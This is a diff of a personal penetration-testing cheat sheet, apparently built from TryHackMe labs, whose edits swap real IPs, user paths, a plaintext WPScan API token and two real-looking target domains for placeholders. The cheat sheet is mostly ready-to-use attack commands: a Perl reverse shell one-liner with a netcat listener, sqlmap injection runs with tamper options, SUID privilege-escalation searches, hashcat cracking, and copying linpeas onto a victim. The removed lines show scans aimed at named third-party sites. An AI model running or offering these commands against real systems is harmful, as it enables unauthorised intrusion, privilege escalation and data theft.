@@ -2,7 +2,7 @@
 ONE-LINER
 ---------------------------------------------------------------------------------------------------------------------
 Reverse Shell One-Liner
-perl -e 'use Socket;$i="10.11.36.200";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="#URL_HERE#";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 Open a netcat on your system using
 nc -lnvp 4444
@@ -29,8 +29,15 @@ which nmap aws nc ncat netcat nc.traditional wget curl ping gcc gcc-5 g++ make g
 
 ----------------------------------------------------------
 
-USING GOBUSTER
+DIRECTORY ENUMERATION TOOLS
 gobuster dir -u 10.10.187.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 120 -x txt,php,html
+
+Another Dict Location
+/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+
+feroxbuster -u  http://10.10.101.55:9999/ --thorough -x php,txt -t 100 --random-agent -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --depth 1
+
+
 
 __________________________________________________________
 
@@ -38,10 +45,10 @@ SQLMAP COMMAND
 
 
 FOR URLS
-sqlmap -u "http://10.10.94.82/simple/moduleinterface.php?mact=News,m1_,default,0" --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=/home/kaiser/Downloads/favpass.txt" --dbs
+sqlmap -u "http://10.10.94.82/simple/moduleinterface.php?mact=News,m1_,default,0" --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs
 
 FOR POST-REQUESTS
-sqlmap -r postrequest.txt -p Username --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=/home/kaiser/Downloads/favpass.txt" --dbs
+sqlmap -r postrequest.txt -p Username --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs
 
 
 
@@ -81,7 +88,7 @@ find / -perm +6000 2>/dev/null | grep '/bin/'
 find suid binaries for privilege escalation one liner
 find / -perm -4000 2>/dev/null
 
-find suid binaried for root privilege escalation one liner (tryhackme)
+find suid binaries for root privilege escalation one liner (tryhackme)
 find / -user root -perm -4000 -exec ls -ldb {} \;
 
 find files that can be run by group for privilege escalation one liner
@@ -109,7 +116,7 @@ fg               #brings netcat session back to the foreground
 export TERM=xterm
 
 ----------------------------------------------------------
-Copy files over ssh from attacher machine to victim
+Copy files over ssh from attacker machine to victim
 scp ~/Documents/tools/linpeas.sh jan@10.10.58.82:/dev/shm
 
 CRACKING
@@ -119,7 +126,7 @@ hashidentifier
 
 
 Crack an md5 hash
-hashcat -m 0 -a 0 -o cracked.txt c3fcd3d76192e4007dfb496cca67e13b /home/kaiser/Downloads/favpass.txt
+hashcat -m 0 -a 0 -o cracked.txt c3fcd3d76192e4007dfb496cca67e13b ~/Downloads/favpass.txt
 
 
 TO BRUTEFORCE USERNAME FROM LIST WITH PASSWORD AS "test"
@@ -151,9 +158,9 @@ gpg2john tryhackme.asc > pgpjohn
 
 TOOLS
 -----------------------------------------------------------------------------------------------------------------------
-wpscan --api-token DyFPHYTeV1Q7eFmi5Htz5sMNHtSwIhZ3vUFrHTomVfs --random-user-agent -e --url vfdgroup.com | tee vfdgroup_wpscan.txt
+wpscan --api-token #WPSCAN_API# --random-user-agent -e --url 3#URL_HERE# | tee wpscan.txt
 
-python3 sqlmap.py -u "https://grvlagos.com/?s= --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=/home/josfemson/dict/favpass.txt" --dbs
+python3 sqlmap.py -u "https://#URL_HERE#/?s= --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/dict/favpass.txt" --dbs
 
 
 
@@ -213,6 +220,7 @@ head,cat,less,more,tail
 ---------------------------
 SITES FOR COMMANDS
 https://gtfobins.github.io/
+https://wadcoms.github.io
 
 
 ---------------------------
